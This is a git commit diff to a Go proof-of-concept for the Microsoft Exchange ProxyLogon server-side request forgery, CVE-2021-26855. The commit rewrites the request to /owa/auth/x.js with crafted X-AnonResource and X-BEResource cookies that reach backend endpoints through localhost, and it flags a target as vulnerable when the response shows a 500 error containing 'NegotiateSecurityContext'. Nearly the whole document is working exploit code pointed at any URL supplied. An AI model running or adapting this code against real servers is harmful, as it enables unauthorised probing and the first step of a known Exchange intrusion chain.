4522d583a69981c3fb15bedb8baf354e77e77d72
Lucifer1993 <297954441@qq.com>
2023-04-04 18:04:12 +0800

    Update cve_2021_26855.go

--- cve_2021_26855.go
+++ cve_2021_26855.go
@@ -2,22 +2,23 @@ package main
 
 import (
 	"fmt"
+	"io/ioutil"
 	"net/http"
 	"os"
+	"strings"
 )
 
 func main() {
 	fmt.Println("Usage: ./cve_2021_26855 url")
 	targeturl := os.Args[1]
-	random_file := "poc.ttf"
 	client := &http.Client{}
 
-	req, err := http.NewRequest("GET", targeturl+"/ecp/"+random_file, nil)
+	req, err := http.NewRequest("GET", targeturl+"/owa/auth/x.js", nil)
 	if err != nil {
 		panic(err)
 	}
 
-	req.Header.Set("Cookie", "X-BEResource=localhost~1942062522")
+	req.Header.Set("Cookie", "X-AnonResource=true; X-AnonResource-Backend=localhost/ecp/default.flt?~3; X-BEResource=localhost/owa/auth/logon.aspx?~3;")
 	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.50 AttackEx (KHTML, like Gecko) Version/5.1 Safari/534.50")
 
 	resp, err := client.Do(req)
@@ -26,8 +27,8 @@ func main() {
 	}
 
 	defer resp.Body.Close()
-
-	if resp.StatusCode == 200 && resp.Header.Get("X-CalculatedBETarget") != "" && resp.Header.Get("X-FEServer") != "" {
+	body, err := ioutil.ReadAll(resp.Body)
+	if resp.StatusCode == 500 && strings.Contains(string(body), "NegotiateSecurityContext") {
 		fmt.Println("poc success")
 		fmt.Println("X-CalculatedBETarget:", resp.Header.Get("X-CalculatedBETarget"))
 		fmt.Println("X-FEServer:", resp.Header.Get("X-FEServer"))
